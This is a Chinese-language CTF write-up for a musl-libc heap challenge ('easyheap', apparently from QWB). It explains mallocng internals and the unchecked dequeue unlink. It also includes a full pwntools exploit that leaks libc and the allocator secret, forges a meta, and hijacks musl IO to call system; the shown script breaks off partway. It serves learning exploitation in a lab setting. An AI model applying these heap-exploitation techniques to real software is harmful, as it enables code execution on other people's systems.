<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your name!&quot;</span>);</span><br><span class="line">readn(info.header-&gt;name, len);</span><br></pre></td></tr></table></figure>
<p>输入 num 时没有进行限制，导致可以将 heap 上的任意数据写入 mmapg</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num = input_num();</span><br><span class="line">......</span><br><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<p><strong>libc musl</strong></p>
<p>musl 把 chunk 大小分为48类，用 size_to_class 进行计算（与 <code>*active[48]</code> 对应）</p>
<p>mallocng 在分配 meta 时，总是先分配一页的内存，然后划分为多个 meta 区域，而该页的最开始存放的就是 meta_area（这一页的内存用于管理 chunk）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> check; <span class="comment">/* 用于和malloc_context-&gt;secret进行匹配 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">/* 下一个节点指针 */</span></span><br><span class="line">	<span class="keyword">int</span> nslots; <span class="comment">/* 当前使用的meta数量 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> <span class="comment">/* 指向meta的指针(结构体meta_area后面的内存就是meta数组) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">/* 双向链表 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span> <span class="comment">/* 指向group */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask; <span class="comment">/* 可用/释放chunk的bitmap */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">/* 表示最后一个chunk的下标 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">/* group的大小,如果mem是mmap分配,固定为63 */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>; <span class="comment">/* 如果group是mmap分配的,则代表内存页数,否则为&#x27;0&#x27; */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>多个相同大小的 chunk（物理相邻）以及一些控制信息会组成 group</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span> <span class="comment">/* 指回meta */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>]; <span class="comment">/* 0x10字节对齐(NUIT为0x10) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[]; <span class="comment">/* 存放chunk数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>chunk 没有专门在代码中定义，但总体结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> prev_user_data[]; <span class="comment">/* 用于存储上一个chunk的数据 */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx; <span class="comment">/* 低5bit作为idx表示这是group中第几个chunk,高3bit作为预留位 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">/* 与第一个chunk的偏移 */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[]; <span class="comment">/* 用于存储数据 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add([<span class="number">1</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">2</span>]*<span class="number">6</span>)</span><br><span class="line">add([<span class="number">3</span>]*<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<p>可以在 GDB 中打印此数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放前 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x556060e0</span>	<span class="number">0x00005555</span>	<span class="number">0x0000000e</span>	<span class="number">0x00000000</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0xffffffff</span>	<span class="number">0x00020100</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0xfffffffa</span>	<span class="number">0x00040200</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x0000000f</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x555555604cc0</span> <span class="comment">/* 释放后 */</span></span><br><span class="line"><span class="number">0x555555604cc0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x0000000e</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk1 */</span></span><br><span class="line"><span class="number">0x555555604cd0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0x555555604ce0</span>:	<span class="number">0x00000001</span>	<span class="number">0x00000001</span>	<span class="number">0x00000002</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk2 */</span></span><br><span class="line"><span class="number">0x555555604cf0</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x555555604d00</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000002</span>	<span class="number">0x00000010</span>	<span class="number">0x0000ff00</span> <span class="comment">/* chunk3 */</span></span><br><span class="line"><span class="number">0x555555604d10</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0x00000003</span></span><br><span class="line"><span class="number">0x555555604d20</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000003</span>	<span class="number">0xfffffffd</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前6个数据是输入的 num，第7个数据是计算的结果，第8个数据就是 <code>idx offset</code></li>
</ul>
<p>musl 中的 unlink 依赖与如下的函数，本身缺乏检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>dequeue</code>函数的触发条件如下：</p>
<ul>
<li>队列不能为空</li>
<li>队列的头指针不能为空</li>
<li>队列中至少有一个元素</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>现在有4字节的溢出，可以覆盖 <code>chunk-&gt;idx,offset</code>，不过首先需要利用溢出泄露 libc_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment"># 0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment"># 0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7ffec78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi <span class="number">0x7ffff7ffec78</span> ◂— <span class="number">0x6464646464646464</span> (<span class="string">&#x27;dddddddd&#x27;</span>)</span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffff7ffec90</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7ffff7ffeca8</span> —▸ <span class="number">0x7ffff7ffe870</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>由于 meta 所在页与 group 所在页分离，想要伪造 meta，就必须要泄露 secret：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmapg[index] = chunk[num];</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 num 没有限制，因此可以将 heap 上的 secret 写入 mmapg</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br></pre></td></tr></table></figure>
<p>接下来就是布置堆风水，将当前堆块的最后 4 个字节设置为 0xdeadbeef010，通过 4 字节溢出将下一个堆块的 offset 值设置为 0 </p>
<p>释放下一个 chunk，将 meta 劫持到 0xdeadbeef010 处，然后程序会执行 <code>dequeue</code> 将 fake meta unlink，在此处会触发一次 WAA 任意写，我们的目标就是劫持 musl IO 并执行 system</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./easyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1528)\nb *$rebase(0x1AC6)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare</span>():</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Code: &quot;</span>,<span class="string">&quot;W31C0M3_to_QWB21&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_Cr34t3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;need?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(nums)))</span><br><span class="line">    <span class="keyword">for</span> idx,n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, nums</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_M0d1Fy&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;modify?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">for</span> idx, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">        sla(<span class="string">&quot;num&quot;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_D3l3Te&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;delete?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;$ &quot;</span>, <span class="string">&quot;QWB_G00dBye&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>(<span class="params">answers, name=<span class="literal">None</span>, wait=<span class="literal">False</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> ans <span class="keyword">in</span> answers:</span><br><span class="line">        <span class="keyword">if</span> wait:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(ans) == <span class="built_in">int</span>:</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, <span class="built_in">str</span>(ans))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hint, nums = ans</span><br><span class="line">            sla(<span class="string">&quot;answer: &quot;</span>, hint)</span><br><span class="line">            <span class="keyword">if</span> hint == <span class="string">&quot;whos_your_daddy&quot;</span>:</span><br><span class="line">                sla(<span class="string">&quot;Input:&quot;</span>, <span class="built_in">str</span>(nums))</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    sla(<span class="string">&quot;name?&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">    sa(<span class="string">&quot;name!&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0xFFFFFFFF</span>]*<span class="number">20</span>) <span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#0</span></span><br><span class="line">exit()</span><br><span class="line">challenge([<span class="number">0x0</span>], <span class="string">&quot;d&quot;</span> * <span class="number">0x18</span>, <span class="literal">True</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0xb7870</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line">add([<span class="number">0x0</span>]*<span class="number">3</span>) <span class="comment">#1</span></span><br><span class="line">exit()</span><br><span class="line">challenge([(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1228</span>),(<span class="string">&quot;whos_your_daddy&quot;</span>, <span class="number">1221</span>)])</span><br><span class="line"></span><br><span class="line">prepare()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, [<span class="number">0</span>] * <span class="number">12</span> + [<span class="number">0xdbeef010</span>, <span class="number">0xdea</span>, <span class="number">0x0</span>])</span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x50a90</span></span><br><span class="line">add([<span class="number">0x6e69622f</span>, <span class="number">0x68732f</span>] + [<span class="number">0x0</span>] * <span class="number">8</span> + [<span class="number">0xdeadbeef</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbeefdead</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, system &amp; <span class="number">0xffffffff</span>, system &gt;&gt; <span class="number">32</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add([<span class="number">0x0</span>] * <span class="number">14</span>)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">stdout = libc_base + <span class="number">0xb4280</span></span><br><span class="line">base_address = libc_base + <span class="number">0xb7a90</span></span><br><span class="line">stdout_ptr = system + <span class="number">0x63920</span></span><br><span class="line">fake_chunk = libc_base + <span class="number">0xb7cc0</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;base_address &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(base_address))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;fake_chunk &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(fake_chunk))</span><br><span class="line">success(<span class="string">&quot;stdout_ptr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdout_ptr))</span><br><span class="line">success(<span class="string">&quot;break_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base + <span class="number">0x2AB17</span>))</span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_value = (<span class="number">20</span> &lt;&lt; <span class="number">6</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) | <span class="number">1</span> | (<span class="number">0xfff</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">challenge([(<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>), (<span class="string">&quot;next_next&quot;</span>, <span class="number">0</span>),</span><br><span class="line">           <span class="number">0x0</span>, <span class="number">0x0</span>,</span><br><span class="line">           fake_chunk &amp; <span class="number">0xffffffff</span>, fake_chunk &gt;&gt; <span class="number">32</span>,  <span class="comment"># prev</span></span><br><span class="line">           stdout_ptr &amp; <span class="number">0xffffffff</span>, stdout_ptr &gt;&gt; <span class="number">32</span>,  <span class="comment"># next</span></span><br><span class="line">           base_address &amp; <span class="number">0xffffffff</span>, base_address &gt;&gt; <span class="number">32</span>,  <span 